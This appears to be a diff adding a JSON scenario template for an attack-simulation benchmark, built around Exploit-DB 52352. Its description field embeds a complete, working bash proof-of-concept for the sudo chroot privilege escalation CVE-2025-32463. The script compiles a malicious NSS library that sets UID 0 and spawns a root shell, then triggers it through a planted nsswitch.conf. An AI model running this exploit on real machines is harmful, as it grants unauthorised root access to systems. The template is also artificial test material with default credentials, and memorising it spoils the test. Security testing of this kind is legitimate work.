@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_52352",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo chroot 1.9.17 - Local Privilege Escalation (CVE-2025-32463)\n\nExploit source code (52352.txt):\n```\nExploit Title: Sudo chroot 1.9.17 - Local Privilege Escalation\nGoogle Dork: not aplicable\nDate: Mon, 30 Jun 2025\nExploit Author: Stratascale\nVendor Homepage:https://salsa.debian.org/sudo-team/sudo\nSoftware Link:\nVersion: Sudo versions 1.9.14 to 1.9.17 inclusive\nTested on: Kali Rolling 2025-7-3\nCVE : CVE-2025-32463\n\n*Version running today in Kali:*\nhttps://pkg.kali.org/news/640802/sudo-1916p2-2-imported-into-kali-rolling/\n\n*Background*\n\nAn attacker can leverage sudo's -R (--chroot) option to run\narbitrary commands as root, even if they are not listed in the\nsudoers file.\n\nSudo versions affected:\n\n    Sudo versions 1.9.14 to 1.9.17 inclusive are affected.\n\nCVE ID:\n\n    This vulnerability has been assigned CVE-2025-32463 in the\n    Common Vulnerabilities and Exposures database.\n\nDetails:\n\n    Sudo's -R (--chroot) option is intended to allow the user to\n    run a command with a user-selected root directory if the sudoers\n    file allows it.  A change was made in sudo 1.9.14 to resolve\n    paths via chroot() using the user-specified root directory while\n    the sudoers file was still being evaluated.  It is possible for\n    an attacker to trick sudo into loading an arbitrary shared\n    library by creating an /etc/nsswitch.conf file under the\n    user-specified root directory.\n\n    The change from sudo 1.9.14 has been reverted in sudo 1.9.17p1\n    and the chroot feature has been marked as deprecated.  It will\n    be removed entirely in a future sudo release.  Because of the\n    way sudo resolves commands, supporting a user-specified chroot\n    directory is error-prone and this feature does not appear to\n    be widely used.\n\n    A more detailed description of the bug and its effects can be\n    found in the Stratascale advisory:\n    https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot\n\nImpact:\n\n    On systems that support /etc/nsswitch.conf a user may be able\n    to run arbitrary commands as root.\n\n*Exploit:*\n\n*Verify the sudo version running: sudo --versionIf is vulnerable, copy and\npaste the following code and run it.*\n*----------------------*\n#!/bin/bash\n# sudo-chwoot.sh – PoC CVE-2025-32463\nset -e\n\nSTAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)\ncd \"$STAGE\"\n\n# 1. NSS library\ncat > woot1337.c <<'EOF'\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor))\nvoid woot(void) {\n    setreuid(0,0);          /* change to UID 0 */\n    setregid(0,0);          /* change  to GID 0 */\n    chdir(\"/\");             /* exit from chroot */\n    execl(\"/bin/bash\",\"/bin/bash\",NULL); /* root shell */\n}\nEOF\n\n# 2. Mini chroot with toxic nsswitch.conf\nmkdir -p woot/etc libnss_\necho \"passwd: /woot1337\" > woot/etc/nsswitch.conf\ncp /etc/group woot/etc            # make getgrnam() not fail\n\n# 3. compile libnss_\ngcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c\n\necho \"[*] Running exploit…\"\nsudo -R woot woot                 # (-R <dir> <cmd>)\n                                   # • the first “woot” is chroot\n                      \n```",
+  "cve": "CVE-2025-32463",
+  "exploitdb_id": "52352",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_52352",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
